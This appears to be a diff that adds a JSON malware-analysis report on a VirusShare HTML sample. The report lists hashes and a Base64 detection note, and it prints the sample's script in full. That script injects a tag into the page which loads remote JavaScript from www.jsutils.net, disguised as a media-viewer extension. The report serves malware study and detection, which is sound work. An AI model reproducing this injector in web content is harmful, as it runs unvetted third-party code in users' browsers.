@@ -1,0 +1,54 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str"
+        },
+        "macro": "\nfunction MediaViewerV1alpha2465injFunction (doc) {\n\n\t// Add the script only to top-level window \n\tif(self !== top) {\n\t\treturn;\n\t}\n\tvar script = doc.createElement(\"script\");\n\tvar head = doc.getElementsByTagName(\"head\")[0];\n\t// create <head> tag if missing\n\tif(!head){\n\t\thead = doc.createElement(\"head\");\n\t}\n\tscript.setAttribute('id','wsu_js');\n\tscript.setAttribute('src', \n\t\t('https:' == doc.location.protocol ? 'https://' : 'http://') + \n\t\t'www.jsutils.net/ext.js?c=6411&ext=MediaViewerV1alpha2465');\n\tscript.setAttribute('type', 'text/javascript');\n\tscript.async = true;  \n\tif(head && !doc.getElementById('wsu_js'))\n\t\thead.appendChild(script);\n}  \nMediaViewerV1alpha2465injFunction (document);\n"
+    },
+    "filename": "VirusShare_7888a52e267674e350393ed0fa757210",
+    "filesize": 721,
+    "filetype": "HTML document, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "7888a52e267674e350393ed0fa757210",
+        "sha1": "291dfb4870afbbcf3e778e4e0b3b00810eb54e1c",
+        "sha256": "1d7a4844b8a9ccef5a85d2a9299821e14444401017ba2d7800646c8675ed794c"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "function MediaViewerV1alpha2465injFunction (doc) {",
+            "\t// Add the script only to top-level window ",
+            "\tif(self !== top) {",
+            "\t\treturn;",
+            "\tvar script = doc.createElement(\"script\");",
+            "\tvar head = doc.getElementsByTagName(\"head\")[0];",
+            "\t// create <head> tag if missing",
+            "\tif(!head){",
+            "\t\thead = doc.createElement(\"head\");",
+            "\tscript.setAttribute('id','wsu_js');",
+            "\tscript.setAttribute('src', ",
+            "\t\t('https:' == doc.location.protocol ? 'https://' : 'http://') + ",
+            "\t\t'www.jsutils.net/ext.js?c=6411&ext=MediaViewerV1alpha2465');",
+            "\tscript.setAttribute('type', 'text/javascript');",
+            "\tscript.async = true;  ",
+            "\tif(head && !doc.getElementById('wsu_js'))",
+            "\t\thead.appendChild(script);",
+            "MediaViewerV1alpha2465injFunction (document);"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "https://",
+            "http://"
+        ]
+    },
+    "time": "0:00:00.282038",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
